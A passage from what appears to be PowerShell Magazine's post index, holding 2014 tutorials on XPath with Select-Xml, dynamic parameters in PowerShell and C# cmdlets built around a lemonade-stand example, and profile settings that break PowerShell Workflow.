open.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/26/pstip-using-xpath-in-powershell-part-3/","tags":["Tips and Tricks","XML"],"title":"#PSTip Using XPath in PowerShell, Part 3"},{"categories":["Tips and Tricks","XML"],"contents":"XPath can be used to apply ‘filter left’ philosophy to XML documents. For example we can find any h1 element with ‘title’ id using the following syntax:\nSelect-Xml -Path .\\TestPage.xhtml -XPath \"//h1[@id = 'title']\"  Note: You can find the code and input file here.\nAs you can see, XPath syntax has two parts: actual path (//h1) and filter (expression in square brackets). This is sufficient for simple documents. Unfortunately most XML documents used in real world scenarios contain XML namespaces. As a minimum there is a default namespace defined. Perfect example is a valid XHTML document that should have proper namespace declaration on html node:\n\u0026lt;html xmlns=\"http://www.w3.org/1999/xhtml\"\u0026gt;  XML documents that define namespaces (including default namespace) require that we do the same for Select-Xml cmdlet, otherwise our XPath queries won’t work. We pass namespaces definition to Select-Xml using the –Namespace parameter. This parameter accepts a hash table with keys that we will use in our XPath queries as prefix to elements names and values equal to value of xmlns attributes:\nSelect-Xml -Path .\\TestPage.xhtml -XPath \u0026quot;//x:h1[@id = 'title']\u0026quot; -Namespace @{ x = 'http://www.w3.org/1999/xhtml' } | ForEach-Object { $_.Node } | Format-Table -AutoSize id #text -- ----- title This is first H1 directly under 'body' It is important to note that prefix used in XPath is owned by us; the only requirement is that is has to be unique for each namespace.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/25/pstip-using-xpath-in-powershell-part-2/","tags":["Tips and Tricks","XML"],"title":"#PSTip Using XPath in PowerShell, Part 2"},{"categories":["Tips and Tricks","XML"],"contents":"This is the first tip in a series of Select-Xml/XPath tips.\nWorking with XML documents in PowerShell is relatively easy. For most things it is enough to read XML file and convert it to XmlDocument object using XML type accelerator:\n$xml = [XML](Get-Content .\\Test.xml)  Note: You can find the code and input files here.\nBecause PowerShell will present XML as an object with nested properties, we can easily access values of child elements:\n$xml.root.node[0].subNode  Additionally, with features introduced in PowerShell 3.0 we can now retrieve data from any level within XML document without worrying if certain elements (like ‘node’ in example above) will be present as an array of objects.\nThe moment it gets more complex is when we want to access certain type of children without knowing parent names, all the way up to root node. Or worse: children we are after can dynamically move between different parents, and we want to access their values without testing every single node within XML document.\nThis is when we may start to appreciate cmdlet designed to make XML parsing easier–Select-Xml. Simple example: we want to read all h1 headings within XHTML document:\nSelect-Xml -Path .\\TestPage.xhtml -XPath //h1 | ForEach-Object { $_.Node } | Format-Table -AutoSize InnerText, ParentNode InnerText ParentNode --------- ---------- This is first H1 directly under 'body' body This is my h1 in list! li Another h1 in table header... th and h1 hidden in the table cell... td As you can see: it worked fine for any h1 heading–one directly in the body, one in some list, in the table header, and the table cell. Getting same results using XmlDocument object and member notation would be way harder. And we haven’t even started to use things that XPath has to offer. Stay tuned for the second tip in a series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/24/pstip-using-xpath-in-powershell-part-1/","tags":["Tips and Tricks","XML"],"title":"#PSTip Using XPath in PowerShell, Part 1"},{"categories":["PSCmdlet","How To"],"contents":"In my last article I wrote, I covered how to create dynamic parameters in a PowerShell cmdlet. If you haven’t read that article, please read that one before continuing with this one as I reference it several times in this article. I also encourage you to read Carlos Perez’s articles on how to create cmdlets with C#.\nIn this article, I will be using the example of an electronic lemonade stand (ELS) again. As a reminder, the primary function of ELS was to sell lemonade, but it could also sell water, tea, and coffee. The ELS assumes you want lemonade if you don’t specify the product. The only thing it requests by default is the quantity.\nC# Base Code The base code for the C# cmdlet is similar to the base script for our PowerShell cmdlet. I will point out some of the differences that you should know. Following Carlos’ article, I created a Class Library project in Visual Studio and named the project GetOrder. I renamed the Class1.cs to GetOrder and changed the namespace to GetOrder. Here is our base code for our Get-Order cmdlet. You can download the starter code for this cmdlet by visiting https://github.com/Ben0xA/Get-Order\nusing System; using System.Collections.ObjectModel; using System.Management.Automation; namespace GetOrder { [Cmdlet(VerbsCommon.Get, \u0026quot;Order\u0026quot;)] public class GetOrder : PSCmdlet { [Parameter( Mandatory = true, Position = 1, HelpMessage = \u0026quot;How many cups would you like to purchase?\u0026quot; )] public int Cups; [Parameter( Mandatory = false, Position = 2, HelpMessage = \u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;)] public string Product = \u0026quot;Lemonade\u0026quot;; protected override void ProcessRecord() { Collection\u0026amp;lt;String\u0026amp;gt; order = new Collection\u0026amp;lt;string\u0026amp;gt;(); for (int cup = 1; cup \u0026amp;lt;= Cups; cup++) { order.Add(cup.ToString() + \u0026quot;: A cup of \u0026quot; + Product); } WriteObject(order, true); } } }  The above code works the same way as our previous PowerShell cmdlet. The customer will specify how many Cups they would like. The customer can also specify the Product if they don’t want the default product of Lemonade. Then it will return an order with that many Cups of the Product.\nThe best thing about using C# or PowerShell is that the code is ‘almost’ good enough to copy and paste from one to the other. You do have to make changes to the declarations and variable names but otherwise it follows the same layout and logic flow. If you compare the above code to our previous base script, you will see that they just about mirror each other.\n You must compile the Class Library before you can use it. You do this by pressing F7 or use the Build Solution from the Build menu.\n Here is the output from our new C# ELS system which matches our previous PowerShell ELS system:\nPS C:\\psf\\scripts\u0026gt; Import-Module C:\\Development\\Get-Order\\Get-Order\\bin\\Release\\Get-Order.dll PS C:\\psf\\scripts\u0026gt; Get-Order 3 1: A cup of Lemonade 2: A cup of Lemonade 3: A cup of Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Water\u0026quot; 1: A cup of Water 2: A cup of Water 3: A cup of Water PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Tea\u0026quot; 1: A cup of Tea 2: A cup of Tea 3: A cup of Tea PS C:\\psf\\scripts\u0026gt; Now we can begin to add support for the alcoholic product, Hard Lemonade. Again, as a reminder, if the customer asks for Hard Lemonade as the product, then the ELS system must verify that the customer is 21 years old or older.\nDynamic Parameters Definition and Resources A dynamic parameter is defined in the about_Functions_Advanced_Parameters documentation. This can be found at http://technet.microsoft.com/en-us/library/hh847743.aspx or by typing: Get-Help about_Functions_Advanced_Parameters.\nFor C# we can utilize two other resources when implementing dynamic parameters into our C# cmdlets. The first resource available to us is ‘Cmdlet Dynamic Parameters’ which can be found at http://msdn.microsoft.com/en-us/library/dd878299. This resource defines dynamic parameters as “parameters that are available to the user under special conditions, such as when the argument of another parameter is a specific value. These parameters are added at runtime and are referred to as dynamic parameters because they are added only when they are needed.”\nThe second resource available to us is ‘How to Declare Dynamic Parameters’ which can be found at http://msdn.microsoft.com/library/dd878334. Our ELS system will use this resource as the guide for creating our dynamic parameter.\nCreating a Dynamic Parameter Creating a dynamic parameter in C# is similar to our PowerShell script with some obvious differences. The biggest difference is that our dynamic parameters are in a separate class. You use the GetDynamicParameters function to return the parameter object from our dynamic parameter class. Here is a list of steps to create the dynamic parameter in C#.\nSteps Overview Here is a list of the steps that need to be completed before you can use your dynamic parameter.\n Add the IdynamicParameters interface to the cmdlet class declaration. Define the GetDynamicParameters function. Create the age class that returns the dynamic parameter. Define the age parameter. In the GetDynamicParameters function, create a new instance of the dynamic parameter class. Return the parameter from the dynamic parameter class.  Add the IdynamicParameters Interface We need to add the IdynamicParameters to our Get-Order class declaration. This is done by adding IdynamicParameters to the end of the line that reads:\npublic class GetOrder : PSCmdlet  So our declaration line now looks like this:\npublic class GetOrder : PSCmdlet, IdynamicParameters  Define the GetDynamicParameters Function The GetDynamicParameters function in C# is very similar to the DynamicParam block in our previous PowerShell script. This function determines if a dynamic parameter should be used based on our logic test and then creates a new instance of the dynamic parameter class and returns that object. Using our ELS system we can start with checking the value of Product for our dynamic parameter.\npublic object GetDynamicParameters() { if (Product == \"Hard Lemonade\") { //create age parameter here } }  You will notice in Visual Studio that will tell you that the GetDynamicParameters function has an error of ‘GetOrder.GetOrder.GetDynamicParameters()‘: not all code paths return a value. That’s okay for now. Our function needs to return a value. We haven’t returned anything yet. We will come back to this function in a minute.\nCreate the Age Dynamic Parameter Class Going back to our ELS system, we need to create our parameter attribute for the age parameter. We want to ensure that Mandatory is set to true, HelpMessage is set to “Please enter your age:”, and Position is set to 3. The nice thing about using C# for creating the dynamic parameter is that you don’t need to create the RuntimeDefinedParameter or the Dictionary. You create the parameter the same way you did for the previous two parameters.\nYou can either create a new .cs class file for your AgeDynamicParameter or you can put this code after the closing bracket } of your GetOrder class. For this example, we will put our code after the closing bracket and not use a separate .cs file.\npublic class AgeDynamicParameter { private int _age; [Parameter( Mandatory = true, Position = 3, HelpMessage = \u0026quot;Please enter your age:\u0026quot; )] public int Age { get { return _age; } set { _age = value; } } }  After we add “Hard Lemonade” to our ValidateSet for Product, our code looks like this now:\nusing System; using System.Collections.ObjectModel; using System.Management.Automation; namespace GetOrder { [Cmdlet(VerbsCommon.Get, \u0026quot;Order\u0026quot;)] public class GetOrder : PSCmdlet, IDynamicParameters { [Parameter( Mandatory = true, Position = 1, HelpMessage = \u0026quot;How many cups would you like to purchase?\u0026quot; )] public int Cups; [Parameter( Mandatory = false, Position = 2, HelpMessage = \u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;,\u0026quot;Hard Lemonade\u0026quot;)] public string Product = \u0026quot;Lemonade\u0026quot;; public object GetDynamicParameters() { if (Product == \u0026quot;Hard Lemonade\u0026quot;) { //create age parameter here } } protected override void ProcessRecord() { Collection\u0026amp;lt;String\u0026amp;gt; order = new Collection\u0026amp;lt;string\u0026amp;gt;(); for (int cup = 1; cup \u0026amp;lt;= Cups; cup++) { order.Add(cup.ToString() + \u0026quot;: A cup of \u0026quot; + Product); } WriteObject(order, true); } } public class AgeDynamicParameter { private int _age; [Parameter( Mandatory = true, Position = 3, HelpMessage = \u0026quot;Please enter your age:\u0026quot; )] public int Age { get { return _age; } set { _age = value; } } } }  Creating a New Instance of AgeDynamicParameter Now that we have our AgeDynamicParameter class and Age parameter defined, we need to create a new instance of that class in our GetDynamicParameters function. Before we can create that instance, we need to create a privately scoped variable for our AgeDynamicParameter class. We will call this variable agedynparm. We can put this variable at the top of our GetOrder class just after its declaration.\npublic class GetOrder : PSCmdlet, IDynamicParameters { private AgeDynamicParameter agedynparm = null; [Parameter( Mandatory = true, Position = 1, HelpMessage = \u0026quot;How many cups would you like to purchase?\u0026quot; )] public int Cups;  Going back to our GetDynamicParameters we can now create a new instance of the AgeDynamicParameter class with our agedynparm variable and return that object. Unlike our PowerShell script where we only have to “return” an object if our logic criteria is met, we have to return on all code paths in C#. This is why you see the else {} returning null. This is what the GetDynamicParameters function looks like now:\npublic object GetDynamicParameters() { if (Product == \"Hard Lemonade\") { agedynparm = new AgeDynamicParameter(); return agedynparm; } else { return null; } }  Testing our Dynamic Parameter Now we have a dynamic parameter of Age that will only show up if the Product is set to Hard Lemonade. Now we can get this information for our new product under these conditions. Here is our ELS code right now.\nusing System; using System.Collections.ObjectModel; using System.Management.Automation; namespace GetOrder { [Cmdlet(VerbsCommon.Get, \u0026quot;Order\u0026quot;)] public class GetOrder : PSCmdlet, IDynamicParameters { private AgeDynamicParameter agedynparm = null; [Parameter( Mandatory = true, Position = 1, HelpMessage = \u0026quot;How many cups would you like to purchase?\u0026quot; )] public int Cups; [Parameter( Mandatory = false, Position = 2, HelpMessage = \u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;,\u0026quot;Hard Lemonade\u0026quot;)] public string Product = \u0026quot;Lemonade\u0026quot;; public object GetDynamicParameters() { if (Product == \u0026quot;Hard Lemonade\u0026quot;) { agedynparm = new AgeDynamicParameter(); return agedynparm; } else { return null; } } protected override void ProcessRecord() { Collection\u0026amp;lt;String\u0026amp;gt; order = new Collection\u0026amp;lt;string\u0026amp;gt;(); for (int cup = 1; cup \u0026amp;lt;= Cups; cup++) { order.Add(cup.ToString() + \u0026quot;: A cup of \u0026quot; + Product); } WriteObject(order, true); } } public class AgeDynamicParameter { private int _age; [Parameter( Mandatory = true, Position = 3, HelpMessage = \u0026quot;Please enter your age:\u0026quot; )] public int Age { get { return _age; } set { _age = value; } } } }  Don\u0026rsquo;t forget to build the Class Library before testing. Testing our ELS script we get the following output:\nPS C:\\psf\\scripts\u0026gt; Import-Module C:\\Development\\Get-Order\\Get-Order\\bin\\Release\\Get-Order.dll PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; cmdlet Get-Order at command pipeline position 1 Supply values for the following parameters: (Type !? for Help.) Age: 21 1: A cup of Hard Lemonade 2: A cup of Hard Lemonade 3: A cup of Hard Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 1: A cup of Lemonade 2: A cup of Lemonade 3: A cup of Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Water\u0026quot; 1: A cup of Water 2: A cup of Water 3: A cup of Water PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Tea\u0026quot; 1: A cup of Tea 2: A cup of Tea 3: A cup of Tea PS C:\\psf\\scripts\u0026gt; Excellent! If we specify “Hard Lemonade” as the product parameter, we get prompted for the age parameter. It doesn’t ask our age for the default of “Lemonade” or for “Water”, or “Tea”. However, just like our PowerShell script, we are not done yet. We still need to verify that their age is 21 or older! We haven’t done anything with the new age parameter.\nAlso, note that you can’t Import-Module -Force with the dll file. You need to close PowerShell completely to unload the DLL from memory before you import it again.\nAdding Criteria for the Age Parameter We want to ensure that age is set to 21 or higher so we need to do this logic test in the BeginProcessing() method. We don’t have the BeginProcessing() method in our code so we need to add it above our ProcessRecord() method.\nprotected override void BeginProcessing() { base.BeginProcessing(); }  The logic for this should be that if the age is set and less than 21 it should write an error and stop the script; otherwise, it should continue as normal. So let’s replace the “base.BeginProcessing();” with the following code:\nprotected override void BeginProcessing() { if (agedynparm != null \u0026\u0026 agedynparm.Age \u0026lt; 21) { // write error here. } }  The error that is thrown is not going to be a simple WriteError() method call. The WriteError() method does not have an ErrorAction enum defined in the declaration. What we will use is the ThrowTerminatingError(ErrorRecord) method. To use this method we need to do the following:\n Create an Exception. For this we will use the ParameterBindingException. We will also define the error message here. Create an Error Record using the ParameterBindingException, a null value for the errorId, the ErrorCategory of PermissionDenied, and point it to our agedynparam.Age parameter. Call the ThrowTerminatingError method with our custom ErrorRecord.  You can get more information on the ErrorRecord constructor here . You can also get more information on the ErrorCategory enumeration and the explanation of each category here .\nOur BeginProcessing() method looks like this now:\nprotected override void BeginProcessing() { if (agedynparm != null \u0026\u0026 agedynparm.Age \u0026lt; 21) { ParameterBindingException pbe = new ParameterBindingException(\"You are not old enough for Hard Lemonade. How about a nice glass of regular Lemonade instead?\"); ErrorRecord erec = new ErrorRecord(pbe, null, ErrorCategory.PermissionDenied, agedynparm.Age); ThrowTerminatingError(erec); } }  Final Code, Build, and Testing Once we add our age check in the BeginProcessing() method of our code we now have our finished Electronic Lemonade Stand cmdlet!\nusing System; using System.Collections.ObjectModel; using System.Management.Automation; namespace GetOrder { [Cmdlet(VerbsCommon.Get, \u0026quot;Order\u0026quot;)] public class GetOrder : PSCmdlet, IDynamicParameters { private AgeDynamicParameter agedynparm = null; [Parameter( Mandatory = true, Position = 1, HelpMessage = \u0026quot;How many cups would you like to purchase?\u0026quot; )] public int Cups; [Parameter( Mandatory = false, Position = 2, HelpMessage = \u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;,\u0026quot;Hard Lemonade\u0026quot;)] public string Product = \u0026quot;Lemonade\u0026quot;; public object GetDynamicParameters() { if (Product == \u0026quot;Hard Lemonade\u0026quot;) { agedynparm = new AgeDynamicParameter(); return agedynparm; } else { return null; } } protected override void BeginProcessing() { if (agedynparm != null \u0026amp;\u0026amp; agedynparm.Age \u0026amp;lt; 21) { ParameterBindingException pbe = new ParameterBindingException(\u0026quot;You are not old enough for Hard Lemonade. How about a nice glass of regular Lemonade instead?\u0026quot;); ErrorRecord erec = new ErrorRecord(pbe, null, ErrorCategory.PermissionDenied, agedynparm.Age); ThrowTerminatingError(erec); } } protected override void ProcessRecord() { Collection\u0026amp;lt;String\u0026amp;gt; order = new Collection\u0026amp;lt;string\u0026amp;gt;(); for (int cup = 1; cup \u0026amp;lt;= Cups; cup++) { order.Add(cup.ToString() + \u0026quot;: A cup of \u0026quot; + Product); } WriteObject(order, true); } } public class AgeDynamicParameter { private int _age; [Parameter( Mandatory = true, Position = 3, HelpMessage = \u0026quot;Please enter your age:\u0026quot; )] public int Age { get { return _age; } set { _age = value; } } } } Do your final build of the Class Library and test it in PowerShell. Here is the output from our ESL system.\nTest to ensure previous items still work as originally scripted PS C:\\psf\\scripts\u0026gt; Import-Module C:\\Development\\Get-Order\\Get-Order\\bin\\Release\\Get-Order.dll PS C:\\psf\\scripts\u0026gt; Get-Order 3 1: A cup of Lemonade 2: A cup of Lemonade 3: A cup of Lemonade PS C:\\psf\\scripts\u0026gt; Get-Order 3 Water 1: A cup of Water 2: A cup of Water 3: A cup of Water PS C:\\psf\\scripts\u0026gt; Get-Order 3 Tea 1: A cup of Tea 2: A cup of Tea 3: A cup of Tea PS C:\\psf\\scripts\u0026gt; Get-Order 3 Coffee 1: A cup of Coffee 2: A cup of Coffee 3: A cup of Coffee PS C:\\psf\\scripts\u0026gt; ### Now to test the “Hard Lemonade” product prompt and age logic for a value less than 21 PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; cmdlet Get-Order at command pipeline position 1 Supply values for the following parameters: (Type !? for Help.) Age: 18 Get-Order : You are not old enough for Hard Lemonade. How about a nice glass of regular Lemonade instead? At line:1 char:1 + Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; ~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (18:Int32) [Get-Order], ParameterBindingException + FullyQualifiedErrorId : GetOrder.GetOrder ~~~~~~~~~~~~~~~~~~~~~~~~~~~ PS C:\\psf\\scripts\u0026gt; Now to test the “Hard Lemonade” product prompt and age logic for a value 21 or greater. PS C:\\psf\\scripts\u0026gt; Get-Order 3 \u0026quot;Hard Lemonade\u0026quot; cmdlet Get-Order at command pipeline position 1 Supply values for the following parameters: (Type !? for Help.) Age: 21 1: A cup of Hard Lemonade 2: A cup of Hard Lemonade 3: A cup of Hard Lemonade PS C:\\psf\\scripts\u0026gt; Testing our age dynamic parameter as a 3rd positional parameter.\nTesting our age dynamic parameter as a 3rd positional parameter. PS C:\\psf\\scripts\u0026gt; Get-Order 3 \"Hard Lemonade\" 34 1: A cup of Hard Lemonade 2: A cup of Hard Lemonade 3: A cup of Hard Lemonade PS C:\\psf\\scripts\u0026gt;  Conclusion Success! Just like our PowerShell script, we have created a dynamic parameter that only appears when our product is “Hard Lemonade” and will only return that product if the age is 21 or older. Our previous functionality is still there and our enhancement only shows up under a specific condition. Except this time we did it in C#.\nI hope you have enjoyed this follow up article on dynamic parameters. They are very powerful and very useful in helping you streamline your cmdlets. I wrote this article side by side with my previous one so that you can follow both from start to finish. Please feel free to download the code from my GitHub repository and build your own C# cmdlet with a dynamic parameter.\nAs I mentioned at the beginning of this article, the starter code for this cmdlet is available at https://github.com/Ben0xA/Get-Order. There are two branches available in that repository. The master branch is the starter code. The Final-Code branch contains the final Electronic Lemonade Stand C# cmdlet.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/23/dynamic-parameters-in-c-cmdlets/","tags":["PSCmdlet","How To"],"title":"Dynamic Parameters in C# Cmdlets"},{"categories":["Service Management Automation","Tips and Tricks"],"contents":"When working with Windows PowerShell Workflow, there are things to be aware of which can break workflow from working. One such thing is customizations made in the PowerShell profile.\nLet’s start by defining an example workflow we can work with:\nWorkflow Get-RemoteService { Get-Service -PSComputerName $PSComputerName } When invoking the workflow I got the following errors on my computer:\nPS [3]: Get-RemoteService -PSComputerName srv1 WARNING: The binding of default value \u0026amp;#8216;True\u0026amp;#8217; to parameter 'Keep' failed: Cannot bind parameter \u0026amp;#8216;Keep\u0026amp;#8217; to the target. Exception setting \u0026quot;Keep The Wait\u0026quot; and \u0026quot;Keep parameters cannot be used together in the same command.\u0026quot; Cannot find drive. A drive with the name 'Scripts' does not exist. + CategoryInfo : ObjectNotFound: (Scripts:String) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : DriveNotFound + PSComputerName : [localhost] What is going on here? Let\\`s start by looking at the warning: Cannot bind parameter 'Keep' to the target. This one is hard to track down without knowing that workflow actually uses PowerShell jobs under the hood. The -Wait and -Keep parameters mentioned in the warning message is available on the Receive-Job cmdlet. The two parameters belongs to different parameter sets, and can not be used together. In my case I had the following defined in my PowerShell profile:\n$PSDefaultParameterValues.Add(\u0026quot;Receive-Job:Keep\u0026quot;,$True) To verify this was causing the problem I removed Receive-Job from $PSDefaultParameterValues and re-ran the workflow:\n$PSDefaultParameterValues.Remove(\u0026quot;Receive-Job:Keep\u0026quot;) Get-RemoteService -PSComputerName srv1 This resolved the warning:\nPS [5]: Get-RemoteService -PSComputerName srv1 Cannot find drive. A drive with the name 'Scripts' does not exist. + CategoryInfo : ObjectNotFound: (Scripts:String) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : DriveNotFound + PSComputerName : [localhost] For the second error, we can see an error regarding the Scripts: drive. This is a PSDrive defined in my PowerShell profile, which is the current location in my PowerShell session. Since workflow runs in it`s own runspace, the drive cannot be found.\nAfter changing the current directory to C: which is also available to the workflow runspace, the workflow runs without issues.\ncd c: Get-RemoteService -PSComputerName srv1 The easiest way to exclude profile customizations from breaking a workflow is by launching powershell.exe/powershell_ise.exe with the -NoProfile switch. If the workflow then runs without issues, you should start looking at your PowerShell profile to see what might be interfering with workflow.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/20/pstip-be-cautious-with-profile-customizations-and-powershell-workflow/","tags":["Service Management Automation","Tips and Tricks"],"title":"#PSTip Be cautious with profile customizations and PowerShell Workflow"},{"categories":["How To"],"contents":"Has there ever been a time when you wanted to call a function or cmdlet with specific parameters that were based on conditional criteria that is provided? As an example: if a user requests your cmdlet, with a specific value supplied for a parameter, it should then require a second parameter. This goes beyond utilizing ParameterSets. These are conditional parameters, or more properly referred to as dynamic parameters.\nTo help illustrate the concept of dynamic parameters, I will be using the example of an electronic lemonade stand. We will call it ELS for short. The primary function of ELS is to sell lemonade, but it also sells water, tea, and coffee. The ELS will assume you want lemonade if you don’t specify the product. The only thing it requests by default is the quantity. I’ve created the base script for our ELS system without any dynamic parameters included.\nFunction Get-Order { [CmdletBinding()] Param( [Parameter( Mandatory=$true, Position=1, HelpMessage=\u0026quot;How many cups would you like to purchase?\u0026quot; )] [int]$cups, [Parameter( Mandatory=$false, Position=2, HelpMessage=\u0026quot;What would you like to purchase?\u0026quot; )] [ValidateSet(\u0026quot;Lemonade\u0026quot;,\u0026quot;Water\u0026quot;,\u0026quot;Tea\u0026quot;,\u0026quot;Coffee\u0026quot;)] [string]$product=\u0026quot;Lemonade\u0026quot; ) Process { $order = @() for ($cup = 1; $cup -le $cups; $cup++) { $order += \u0026quot;$($cup): A cup of $($product)\u0026quot; } $order } }  The above script works in this way. The customer will specify how many $cups they would like. The customer can also specify the $product if they don’t want the default product of Lemonade. Then it will return an order with that many $cups of the $product.\nHere is the output from our new ELS system:\nPS C:\\psf\\scripts\u0026gt; Get-Order 3 1: A cup of Lemonade 2: A cup of Lemonade 3: A cup of Lemonade PS C:\\psf\\scripts\u0026amp;gt; Get-Order 3 \u0026quot;Water\u0026quot; 1: A cup of Water 2: A cup of Water 3: A cup of Water PS C:\\psf\\scripts\u0026amp;gt; Get-Order 3 \u0026quot;Tea\u0026quot; 1: A cup of Tea 2: A cup of Tea 3: A cup of Tea PS C:\\psf\\scripts\u0026gt; With the base script ready to go we have a new requirement for our ELS system. The system needs to be able to support a new alcoholic product, Hard Lemonade. If the customer asks for Hard Lemonade as the product, then the ELS system must verify that the customer is 21 years old or older. This leads us into utilizing dynamic parameters.\nDynamic Parameters Defined A dynamic parameter is defined in the about_Functions_Advanced_Parameters documentation. This can be found at http://technet.microsoft.com/en-us/library/hh847743.aspx or by typing: Get-Help about_Functions_Advanced_Parameters. The documentation defines dynamic parameters as “parameters of a cmdlet, function, or script that are available only under certain conditions.” It also specifies that dynamic parameters can also be created so that they appear “only when another parameter is used in the function command or when another parameter has a certain value.” This is exactly what we need to enhance the ELS system to offer Hard Lemonade.\nDynamic Parameters in Get-Help or Get-Command It is important to note that the documentation does point out one word of caution with the use of dynamic parameters. It states to only use them “when necessary” because “they can be difficult for users to discover.” If the conditions are not met for your dynamic parameter to be used it will not show up in the Get-Help unless the user uses the –Path parameter of Get-Help or the –ArgumentList parameter of Get-Command.\nCreating a Dynamic Parameter To create a dynamic parameter, you will need to use the DynamicParam keyword. Unlike the Param keyword, you enclose the statement list in curly brackets {}. Dynamic parameters are declared after the Param() definition if used in a cmdlet.\nDynamicParam The syntax to create a dynamic parameter is:\nDynamicParam {\u0026lt;statement-list\u0026gt;} You specify the condition logic for the parameter in the  section. Using our ELS system we can start with checking the value of $product for our dynamic parameter.\nDynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { #create $age parameter here. } } Steps Overview Before you can use a dynamic parameter you have to do a few things beforehand. Here is a list of the steps that need to be completed before you can use your dynamic parameter.\n  Define the parameter attributes with the ParameterAttribute object. Create an Attribute collection object. Add your ParameterAttribute to the Attribute collection. Create the RuntimeDefinedParameter specifying:  The name of the parameter. The type of the parameter. The Attribute collection object you created in step 2.   Create a RuntimeDefinedParameterDictionary object. Add the RuntimeDefinedParameter to the RuntimeDefinedParameterDictionary. Return the RuntimeDefinedParameterDictionary object.  Creating the ParameterAttribute If we want to specify the attributes of a Parameter, we have to specify it before we create the RuntimeDefinedParameter. This is done with the System.Management.Automation.ParameterAttribute object. The ParameterAttribute object is used to represent the attributes of the parameter. You can set the following properties with the ParameterAttribute object:\nHelpMessage Property string HelpMessage {get;set;} HelpMessageBaseName Property string HelpMessageBaseName {get;set;} HelpMessageResourceId Property string HelpMessageResourceId {get;set;} Mandatory Property bool Mandatory {get;set;} ParameterSetName Property string ParameterSetName {get;set;} Position Property int Position {get;set;} ValueFromPipeline Property bool ValueFromPipeline {get;set;} ValueFromPipelineByPropertyName Property bool ValueFromPipelineByPropertyName {get;set;} ValueFromRemainingArguments Property bool ValueFromRemainingArguments {get;set;} Going back to our ELS system, we need to create our parameter attribute for the $age parameter. We want to ensure that Mandatory is set to $true, HelpMessage is set to “Please enter your age:”, and Position is set to 3.\n$ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.HelpMessage = \u0026quot;Please enter your age:\u0026quot; $ageAttribute.Mandatory = $true $ageAttribute.Position = 3 Our dynamic parameter code looks like this now:\nDynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { $ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.Position = 3 $ageAttribute.Mandatory = $true $ageAttribute.HelpMessage = \u0026quot;Please enter your age:\u0026quot; } } Adding the Attribute to a Collection Now the RuntimeDefinedParameter constructor only accepts a Collection of type Attribute. To pass our $ageAttribute to the RuntimeDefinedParameter we need to first add it to a new collection object. We use the System.Collections.ObjectModel.Collection[Type] object for this. We use the .Add() method to add our $ageAttribute to the collection.\n$attributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute] $attributeCollection.Add($ageAttribute) Our dynamic parameter code looks like this now:\nDynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { $ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.Position = 3 $ageAttribute.Mandatory = $true $ageAttribute.HelpMessage = \u0026quot;Please enter your age:\u0026quot; $attributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute] $attributeCollection.Add($ageAttribute) } } Creating the RuntimeDefinedParameter Now that we have our attributes defined for our parameter and we have it in a collection, we can create the RuntimeDefinedParameter object.\nThe System.Management.Automation.RuntimeDefinedParameter object is used to add a parameter to the parameter list at runtime. The RuntimeDefinedParameter constructor is used to define the parameter name, type, and the attributes of the parameter.\nThe syntax for System.Management.Automation.RuntimeDefinedParameter has two constructors:\nNew-Object System.Management.Automation.RuntimeDefinedParameter() New-Object System.Management.Automation.RuntimeDefinedParameter([String]Name, [Type]ParameterType, [Collection]Attributes)  We want to define the name, type, and the attributes so we will use the second constructor for this object. In the command below I specify that I want to use ‘age’ as the parameter name, it’s of type Int16, and to use the attributes in the $attributeCollection.\n$ageParam = New-Object System.Management.Automation.RuntimeDefinedParameter('age', [Int16], $attributeCollection)  Our dynamic parameter code looks like this now:\nDynamicParam { if ($product -eq \u0026quot;Hard Lemonade\u0026quot;) { $ageAttribute = New-Object System.Management.Automation.ParameterAttribute $ageAttribute.Position = 3 $ageAttribute.Mandatory = $true $ageAttribute.HelpMessage = \u0026quot;Please enter your age:\u0026quot; $attributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute] $attributeCollection.Add($ageAttribute) $ageParam = New-Object System.Management.Automation.RuntimeDefinedParameter('age', [Int16], $attributeCollection) } } Creating the RuntimeDefinedParameterDictionary Before we can reference our new parameter, we 